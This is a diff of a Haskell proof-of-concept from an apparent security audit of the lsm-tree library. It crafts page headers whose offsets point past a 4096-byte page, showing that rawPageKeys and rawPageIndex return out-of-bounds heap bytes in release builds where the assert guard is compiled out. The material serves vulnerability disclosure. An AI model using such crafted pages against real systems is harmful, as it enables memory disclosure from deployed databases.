@@ -1,28 +1,27 @@
--- | PoC: RawPage trusts page-header offsets with no validation.
+-- | PoC: RawPage trusts page-header offsets; the only bounds check is a
+-- Haskell @assert@ that @-O@ compiles away.
 --
 -- Target : IntersectMBO/lsm-tree @ 63a63054 (audited 2026-11-17)
--- Claim  : rawPageKeys/rawPageKeyAt/rawPageIndex derive byte offsets straight
---          from the on-disk page header (Word16 numKeys at idx 0, Word16
---          keysOffset at idx 2). Nothing validates those offsets against the
---          4096-byte page size, and RawBytes.fromByteArray does no bounds
---          check either. Only -fcheck-prim-bounds (present in cabal.project,
---          ABSENT from cabal.project.release) would catch the read.
 --
--- Demo   : one ByteArray of 8192 bytes. First 4096 = the page. Bytes
---          4096..8191 = memory OUTSIDE the page. Header says "keys start at
---          byte 4096", offsets vector says "key 0 lives at byte 5000..5004",
---          and bytes 5000..5004 hold a sentinel. If rawPageKeys returns the
---          sentinel, the page handed out bytes from outside its own region.
+-- Facts established by this program (see the three run modes in CI):
 --
---          In production readDiskPage allocates EXACTLY 4096 bytes
---          (RunReader.hs:314 newPinnedByteArray pageSize), so the same header
---          makes the slice point past the end of the allocation: OOB heap read.
+--  * Release build (cabal.project.release): a page whose header puts the key
+--    directory outside the 4096-byte page returns keys whose bytes live
+--    outside the page -- silently, no exception.
+--
+--  * Release build + -fno-ignore-asserts: the SAME input aborts with
+--    "Assertion failed" at src-core/Database/LSMTree/Internal/Vector.hs:40
+--    (mkPrimVector's isValidSlice check). So the guard exists; it is simply
+--    compiled out of the production configuration.
+--
+-- Read path: RunReader.hs:313-325 readDiskPage allocates EXACTLY 4096 bytes
+-- (newPinnedByteArray pageSize), so any header offset > 4096 is an
+-- out-of-bounds read past the end of that allocation.
 module Main (main) where
 
 import           Control.Exception (SomeException, evaluate, try)
-import           Control.Monad (when)
 import           Data.Bits (shiftR, (.&.))
-import           Data.List (foldl')
+import           Data.List (foldl', isPrefixOf)
 import           Data.Primitive.ByteArray
 import qualified Data.Vector as V
 import           Data.Word (Word16, Word8)
@@ -37,11 +36,9 @@ import           System.Exit (exitFailure)
 pageSize :: Int
 pageSize = 4096
 
--- | Little-endian Word16.
 w16 :: Word16 -> [Word8]
 w16 w = [fromIntegral (w .&. 0xFF), fromIntegral (w `shiftR` 8)]
 
--- | Build a pinned ByteArray of @n@ zero bytes with @patches@ (offset, bytes).
 buildPinned :: Int -> [(Int, [Word8])] -> IO ByteArray
 buildPinned n patches = do
     let bytes = foldl' apply (replicate n 0) patches
@@ -50,18 +47,18 @@ buildPinned n patches = do
     copyByteArray mba 0 (byteArrayFromList bytes) 0 n
     unsafeFreezeByteArray mba
 
+-- | Payload that lives at byte 5000 -- i.e. OUTSIDE the 4096-byte page region.
 sentinel :: [Word8]
 sentinel = map (fromIntegral . fromEnum) "LEAK-OUTSIDE-THE-PAGE"
 
--- | A page whose header points its key directory at byte 4096 (outside the
--- 4096-byte page region) and whose key 0 lives at byte 5000, where the
--- sentinel sits.
+-- | Page header says: 2 keys, key directory at byte 4096, key 0 = bytes
+-- 5000..5004, key 1 = empty. Bytes 5000..5004 hold the sentinel prefix.
 craftedPage :: IO RawPage
 craftedPage = do
     ba <- buildPinned (2 * pageSize)
-            [ (0,    w16 2)                       -- numKeys
-            , (2,    w16 0)                       -- numBlobs
-            , (4,    w16 (fromIntegral pageSize)) -- keysOffset -> byte 4096
+            [ (0,    w16 2)                        -- numKeys
+            , (2,    w16 0)                        -- numBlobs
+            , (4,    w16 (fromIntegral pageSize))  -- keysOffset -> byte 4096
             , (4096, w16 5000 ++ w16 5005 ++ w16 5005)
             , (5000, sentinel)
             ]
@@ -70,69 +67,89 @@ craftedPage = do
 renderKey :: SerialisedKey -> String
 renderKey (SerialisedKey rb) = show (RB.unpack rb)
 
+-- | A returned key is a leak if its bytes are a non-empty prefix of the
+-- sentinel, which only exists outside the page.
+isLeak :: SerialisedKey -> Bool
+isLeak (SerialisedKey rb) = let b = RB.unpack rb in not (null b) && b `isPrefixOf` sentinel
+
 -- | Variant 1: rawPageKeys (bulk accessor).
-variantKeys :: IO ()
+variantKeys :: IO Bool
 variantKeys = do
     page <- craftedPage
     let keys = V.toList (rawPageKeys page)
+        leaked = any isLeak keys
     putStrLn $ "  rawPageNumKeys         = " ++ show (rawPageNumKeys page)
     putStrLn $ "  rawPageKeys            = " ++ show (map renderKey keys)
-    let leaked = any (\(SerialisedKey rb) -> RB.unpack rb == sentinel) keys
-    putStrLn $ "  sentinel from outside page region returned? " ++ show leaked
+    putStrLn $ "  bytes 76,69,65,75,45   = \"LEAK-\" -- live at byte 5000, outside the page"
+    putStrLn $ "  leaked outside page?   = " ++ show leaked
     putStrLn $ if leaked
-      then "  RESULT: FAIL-OPEN -- offsets beyond the page were honoured"
-      else "  RESULT: guard present (offsets rejected or bounded)"
-    when leaked exitFailure
+      then "  RESULT: FAIL-OPEN -- out-of-page bytes returned as keys"
+      else "  RESULT: bounded"
+    pure leaked
 
--- | Variant 2: rawPageIndex -- this is the exact call RunReader.next makes
--- (RunReader.hs:265) when it walks a run file read from disk.
-variantProductionPath :: IO ()
+-- | Variant 2: rawPageIndex -- the exact call RunReader.next makes
+-- (RunReader.hs:265) while walking a run file read from disk.
+variantProductionPath :: IO Bool
 variantProductionPath = do
     page <- craftedPage
-    let res = rawPageIndex page 0 :: RawPageIndex (Entry SerialisedValue BlobSpan)
-    case res of
-      IndexEntry k _ -> do
+    r <- try (evaluate (rawPageIndex page 0 :: RawPageIndex (Entry SerialisedValue BlobSpan)))
+    case r of
+      Left e -> do
+        putStrLn $ "  exception              = " ++ show e
+        putStrLn "  RESULT: bounded (guard fired)"
+        pure False
+      Right (IndexEntry k _) -> do
+        let leaked = isLeak k
         putStrLn $ "  rawPageIndex page 0    = IndexEntry, key = " ++ renderKey k
-        let SerialisedKey rb = k
-        let leaked = RB.unpack rb == sentinel
-        putStrLn $ "  sentinel from outside page region returned? " ++ show leaked
+        putStrLn $ "  leaked outside page?   = " ++ show leaked
         putStrLn $ if leaked
           then "  RESULT: FAIL-OPEN -- production read path returns out-of-page bytes"
-          else "  RESULT: guard present"
-        when leaked exitFailure
-      _ -> putStrLn "  RESULT: index not present (unexpected)"
+          else "  RESULT: bounded"
+        pure leaked
+      Right _ -> do
+        putStrLn "  rawPageIndex page 0    = not an IndexEntry (unexpected)"
+        pure False
 
--- | Variant 3: production shape -- array is exactly 4096 bytes, header points
--- far outside. Shows the release build does not throw.
-variantPastEndOfAllocation :: IO ()
+-- | Variant 3: production shape -- the array is exactly 4096 bytes (as
+-- readDiskPage allocates), header points at byte 65520.
+variantPastEndOfAllocation :: IO Bool
 variantPastEndOfAllocation = do
     ba <- buildPinned pageSize
             [ (0, w16 2)
             , (2, w16 0)
-            , (4, w16 0xFFF0)   -- keys section "at byte 65520" in a 4096-byte page
+            , (4, w16 0xFFF0)   -- key directory "at byte 65520" in a 4096-byte page
             ]
     let page = unsafeMakeRawPage ba 0
     r <- try (evaluate (V.length (rawPageKeys page))) :: IO (Either SomeException Int)
     putStrLn $ "  sizeofByteArray        = " ++ show (sizeofByteArray ba)
     putStrLn $ "  keysOffset (header)    = 0xFFF0 = 65520 bytes"
-    putStrLn $ "  rawPageKeys            = "
-        ++ either (\e -> "threw: " ++ show e)
-                  (\n -> "returned " ++ show n ++ " keys, no exception") r
-    putStrLn $ case r of
-      Left _  -> "  RESULT: bounded (exception raised)"
-      Right _ -> "  RESULT: FAIL-OPEN -- read past the end of the allocation"
+    case r of
+      Left e -> do
+        putStrLn $ "  exception              = " ++ show e
+        putStrLn "  RESULT: bounded (guard fired)"
+        pure False
+      Right n -> do
+        putStrLn $ "  rawPageKeys            = returned " ++ show n ++ " keys, NO exception"
+        putStrLn "  RESULT: FAIL-OPEN -- read ~61 KB past the end of a 4096-byte allocation"
+        pure True
 
 main :: IO ()
 main = do
     putStrLn "=== lsm-tree RawPage offset validation PoC ==="
     putStrLn ""
-    putStrLn "[1] rawPageKeys on a page whose key directory is outside the page region"
-    variantKeys
+    putStrLn "[1] rawPageKeys, key directory outside the page region"
+    a <- variantKeys
     putStrLn ""
-    putStrLn "[2] rawPageIndex -- the exact call RunReader.next makes (RunReader.hs:265)"
-    variantProductionPath
+    putStrLn "[2] rawPageIndex -- exact call RunReader.next makes (RunReader.hs:265)"
+    b <- variantProductionPath
     putStrLn ""
-    putStrLn "[3] page = exactly 4096 B, header points at byte 65520 (production shape)"
-    variantPastEndOfAllocation
+    putStrLn "[3] page = exactly 4096 B (readDiskPage shape), keysOffset = 65520"
+    c <- variantPastEndOfAllocation
     putStrLn ""
-    putStrLn "Guard under test: -fcheck-prim-bounds (in cabal.project, absent in cabal.project.release)"
+    putStrLn "---------------------------------------------"
+    putStrLn $ "leaks: [1]=" ++ show a ++ " [2]=" ++ show b ++ " [3]=" ++ show c
+    if a || b || c
+      then do
+        putStrLn "VERDICT: FAIL-OPEN -- page header offsets are trusted without validation"
+        exitFailure
+      else putStrLn "VERDICT: all variants bounded"
